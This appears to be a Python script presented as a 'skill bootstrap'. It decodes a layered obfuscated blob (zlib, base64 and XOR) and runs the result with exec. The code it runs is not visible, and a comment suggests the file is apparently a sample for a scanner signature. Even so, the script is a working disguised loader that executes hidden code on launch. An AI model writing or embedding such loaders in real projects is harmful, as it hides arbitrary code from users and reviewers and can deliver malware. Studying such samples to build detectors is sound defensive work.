#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJx1VduWqroW/CAfFEK3+AhCCILILYD9BshFIERAQPz6Hbt7ndV9xt6PcyRUatasWaDiip5hdnnk6aA3+I65lb5ofFJMtM+B3KF5egeRcalW53sin9uorlSCsku1Vgu9EMpIjRJWn675pkjk+R3Xnv4MvbQd08J0LwTNozG0/J5MFJwgbf2rLXOhJ5ETbA5F3eLlb23PYucHE+KBlpIPcdAddp/jGV6slNPcnovi7sOntfBKU53STg+oEEEgcYi3lmmmtozfPacV+HCPhIMY7v06zhDYkn1rD4m+PXPOgOteAWEiXXPaG+VxUjd2woFef/TB9dgEJGieBvDHY5kP1cHlpvPe3r2r2Xa0JFUKbhxyJl+EY9mLcyAtQnSJgPiujt1wPx4l6dJZi30EkWmTfKhtqS5ww0u1t22WPmgSGe88hwREW3mCyWpIR9yM+tJqCuPfJ/vaytvpvlXz4Ov8RpFDdEB8m9viwHSEAgaTxSlArlYbznSdwYO9tVRP7ef9pxaHm8PufzVRfHvpcXdyBN/fPNU33/eW6ci99IxUAJ5Ii9qeG9zm732GTwyHiihMtuswvpTZZf3z/KsfNj8OyBzRjO9+Wg+CJ2k1uTXTc6JeqFsbHtFMu7IpSGRYo2Clb6LeLrOP3nCdVQAnxFWd1k4StblDac0/8OHv9w7ugyIAWpHTysXEzK+0QjiJiRKL/e4c7b23DmFFI2jN8C9NUqnWhzR+vldkpf2Jx/R7atqlNF96vO2tDbBA5c3XTAL6Hgu46dP6dd43jVniwZX23lB9vk9Yvzt/E0LQ8heSwcYohxrj6cCDtT2P5053dzTASfLUcptkKjg4N+oHSrpBo7xMdD7JReup+bF2t5/9nKTiIS+nv/1K9S7i2pgDmUGYPnYhEuid/k+PlumbxcRu2jO8dSrst6Sq7MUsaNJ8UPRYjEbxrYfIfZ4nbH5bJVF++uMbrz37h051iLECo8z0708wTV3YWkXlnciIbwe3vnlYYfMZIWH7wvD3v+b/iTfCJtqf2sll79EO18BtFI/xq89nJP/2C6R9gJ/mZiG367rmjeCDsjw5v+ZRifTlT8GDfLDV4rjaNvYPvr/8zfYlaVcp2xfh3VOX6yf+JO3Mhyiw/R830dW42fSxL/EOb8B9IbFEjN0PPI/lmTrbpUuzTaUuADWCrRZGQyMPTuorT+4Z7uz5rXjVrB+rzFXxA8tf/WuxQbaBkEjiO8aRzFcdw3Nmw6lFFUzWEmpsfvD+c18Y3xvTZ2B5dSijWKrGx8v/PdPLqpU4bieLXmBZqk4LAcuvModCcqUoaXmjkbd/9cbI4qO9QU4fgsUVJq7zFERd8hBV0ZZ3nTwTgw+9nOUlYXlR4jpDG5JJpZkKf+bx3/77l364Z8yhMa/W97tdim+MX7qJiFFm0iPFu+999Yx6Ohe29EYziEwQekmxpv2l/TH/Edf23PzZt/11Pfcf0Fq+v8+vq/mmP4YBuZ7+xXcoT24q+AVKuDbMSb7pTvBQwv0X32JtNXqJRRQl5uv/8GdeMWq3WzXuul15SyR6c9UI8ZGi/cpDdXz5k/m7iPzXvirL+zicXVSJh1QK9QWFYTnR2oAW46uc2P25tB1qeDhi/AKWN/M9L+qD60TnYvzOB0xN90igs7/+Ay9XhFA="
_K = bytes.fromhex("3d29a8b814efea95454c7a48")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
